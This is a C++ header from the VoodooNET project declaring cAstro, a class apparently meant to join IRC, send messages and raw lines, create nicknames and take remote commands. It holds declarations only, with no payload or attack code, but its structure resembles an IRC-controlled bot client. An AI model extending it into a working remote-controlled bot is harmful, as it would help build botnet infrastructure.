/*
 *  VoodooNET - a modular multi-threaded program for Windows x86/x64 bit
 *	Coded by VoRTeCKZ - @therealvorteckz
 *  VoRTeCKZ Studios
 *
 *	Copyright (C) 2023 - All Rights Reserved.
 *
 * Permission to ("use, copy, and/or modify") this software for
 * any purpose  with or without fee is hereby granted, provided that the above copyright
 * notice and this permission notice appear in all copies.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED,
 * INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR
 * PURPOSE AND NONINFRINGEMENT OF THIRD PARTY RIGHTS. IN NO EVENT SHALL THE AUTHORS OR
 * COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN
 * ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
 * SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 *
 */

#pragma once
#ifndef __CASTRO_H__
#define __CASTRO_H__
#include "cSocket.h"

class cAstro : public cCommandHandler
{
public:
	cAstro();
	virtual ~cAstro();
	virtual bool HandleCommand(char* cmd, char* params, ...);
	virtual bool Run();
	void Init();
	cSocket	m_cSocket;
	bool m_bConnected;
	bool sendmsg(const char* fmt, ...);
	bool SendRaw(const char* szFmt, ...);
	char* NickCreate();

	bool				m_bRunning;
	command m_cmdIRCName;
	command m_cmdSendMsg;
	command	m_cmdTopic;

	moduload	m_cAstroModule;
};


static struct astro

{

//	cString pCmd;
//	cString cMsg;
}Parse;
#endif